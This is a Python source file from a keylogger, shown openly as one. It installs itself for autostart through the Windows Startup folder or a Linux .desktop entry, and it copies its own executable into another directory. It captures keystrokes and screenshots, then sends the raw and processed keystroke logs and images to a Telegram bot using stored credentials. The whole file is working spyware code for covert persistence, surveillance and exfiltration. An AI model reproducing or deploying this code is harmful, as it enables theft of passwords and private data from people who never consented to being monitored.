import os
from PIL import ImageGrab
import sys
import shutil
from log_utils import write_to_log, format_message, process_keys
from telegram_utils import load_credentials_telegram_from_script, send_info_telegram, send_image_telegram, load_credentials_telegram
from constants import AUTOSTART_CONTENT, DUPLICATE_NAME_FILE, AUTOSTART_DIR, DUPLICATE_EXE_DIR, IMG_DIR, IMG_FILE, LOG_FILE, LOG_FILE_2

def is_windows():
    """
    https://stackoverflow.com/questions/1854/how-to-identify-which-os-python-is-running-on
    https://stackoverflow.com/questions/1325581/how-do-i-check-if-im-running-on-windows-in-python

    Check if the current operating system is Windows.

    Returns:
        bool: True if the current operating system is Windows, False otherwise.
    """
    return os.name == 'nt'

def create_autostart_entry():
    """
    Creates an autostart entry based on the operating system.

    The function checks if the current operating system is Windows by calling the `is_windows()` function.
    If the operating system is Windows, the function calls the `create_autostart_entry_win()` function to create the autostart entry.
    If the operating system is not Windows, the function calls the `create_autostart_entry_linux()` function to create the autostart entry.

    Parameters:
    None

    Returns:
    None
    """
    if is_windows():
        create_autostart_entry_win()
    else:
        create_autostart_entry_linux()

def create_autostart_entry_win():
    """
    https://stackoverflow.com/questions/33178838/python-code-for-program-to-add-itself-to-start-up-windows

    Creates an autostart entry for the application in windows systems.

    This function creates an autostart entry for the application by checking if the desktop entry file already exists. If the file does not exist, it creates a new file with the specified content and prints the path of the created autostart entry. If the file already exists, it prints the path of the existing autostart entry.

    Parameters:
        None

    Returns:
        None
    """
    aup = os.environ.get("ALLUSERSPROFILE")
    up = os.environ.get("USERPROFILE")

    if aup and up:
        script_folder = os.path.dirname(os.path.abspath(sys.argv[0]))
        source_path = os.path.join(script_folder, sys.executable)
        destination_path = os.path.join(up, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", DUPLICATE_NAME_FILE)

        # Check if the file is already in the startup folder
        if not os.path.exists(destination_path):
            shutil.move(source_path, destination_path)
            print(f"File '{DUPLICATE_NAME_FILE}' moved to startup folder successfully.")
        else:
            print(f"File '{DUPLICATE_NAME_FILE}' is already in the startup folder.")
    else:
        print("Oops, couldn't look up stuff in os.environ")

def create_autostart_entry_linux():
    """
    Creates an autostart entry for the application in linux systems.

    This function creates an autostart entry for the application by checking if the desktop entry file already exists. If the file does not exist, it creates a new file with the specified content and prints the path of the created autostart entry. If the file already exists, it prints the path of the existing autostart entry.

    Parameters:
        None

    Returns:
        None
    """
    autostart_path = os.path.expanduser(AUTOSTART_DIR)
    if not os.path.exists(autostart_path):
        os.makedirs(autostart_path)

    desktop_entry_path = os.path.join(autostart_path, f'{DUPLICATE_NAME_FILE}.desktop')

    # Check if the desktop entry file already exists
    if not os.path.exists(desktop_entry_path):
        with open(desktop_entry_path, 'w') as desktop_entry_file:
            desktop_entry_file.write(AUTOSTART_CONTENT)

        print(f'Autostart entry created at: {desktop_entry_path}')
    else:
        print(f'Autostart entry already exists at: {desktop_entry_path}')

def duplicate_script():
    """
    Duplicate the script for the current operating system.

    This function checks the operating system using the `is_windows()` function and calls the appropriate platform-specific function to duplicate the script. If the operating system is Windows, it calls the `duplicate_script_win()` function. Otherwise, it calls the `duplicate_script_linux()` function.

    Parameters:
        None

    Returns:
        None
    """
    if is_windows():
        duplicate_script_win()
    else:
        duplicate_script_linux()
        
def duplicate_script_win():
    """
    Generates a duplicate script by copying the current script executable to a specified directory in windows systems.

    Parameters:
        None

    Returns:
        None
    """
    pass

def duplicate_script_linux():
    """
    Generates a duplicate script by copying the current script executable to a specified directory in linux systems.

    Parameters:
        None

    Returns:
        None
    """
    duplicate_dir = os.path.expanduser(DUPLICATE_EXE_DIR)

    if not os.path.exists(duplicate_dir):
        os.makedirs(duplicate_dir)

    current_script = sys.executable

    duplicate_script_path = os.path.join(duplicate_dir, DUPLICATE_NAME_FILE)

    if not os.path.isfile(duplicate_script_path):
        shutil.copyfile(current_script, duplicate_script_path)
        os.chmod(duplicate_script_path, 0o755)

def take_screenshot():
    """
    Takes a screenshot and saves it as a PNG file in the specified directory.

    Returns:
        - True if the screenshot is successfully taken and saved.
        - False if an exception occurs during the process.

    Raises:
        - Exception: If an error occurs while taking or saving the screenshot.
    """
    try:
        if not os.path.exists(IMG_DIR):
            os.makedirs(IMG_DIR)
            print("Directory {} created successfully!".format(IMG_DIR))

        image_number = 1
        while os.path.isfile('{}{}'.format(IMG_DIR, IMG_FILE + str(image_number) + '.png')):
            image_number += 1

        im = ImageGrab.grab()
        image_name = '{}{}'.format(
            IMG_DIR, IMG_FILE + str(image_number) + '.png')
        im.save(image_name, 'png')

        return im
    except Exception as e:
        print(e)
        return None

def handle_keyboard_interrupt(key_listener):
    """
    Handle a keyboard interrupt event.

    Parameters:
        key_listener (Key_Listener): The key listener object that captures the typed keys.

    Returns:
        None
    """
    # Capture typed keys and process them
    typed_keys = key_listener.get_keys()
    processed_keys = process_keys(typed_keys)
    message = format_message(typed_keys)
    processed_message = format_message(processed_keys)

    # Take screnshot and save it as a PNG file
    screenshot = take_screenshot()

    # Write the message to the log file
    write_to_log(message, LOG_FILE)
    write_to_log(processed_message, LOG_FILE_2)

    credentials = load_credentials_telegram() if (loaded := load_credentials_telegram()) is not None else load_credentials_telegram_from_script()

    # Load credentials a pass to send logs through Telegram
    send_info_telegram(**credentials, message='RAW KEYLOGGER LOG\n\n' + message)
    send_info_telegram(**credentials, message='PROCESSED KEYLOGGER LOG\n\n' + processed_message)
    send_image_telegram(**credentials, image=screenshot)

    try:
        sys.exit(130)
    except SystemExit:
        os._exit(130) 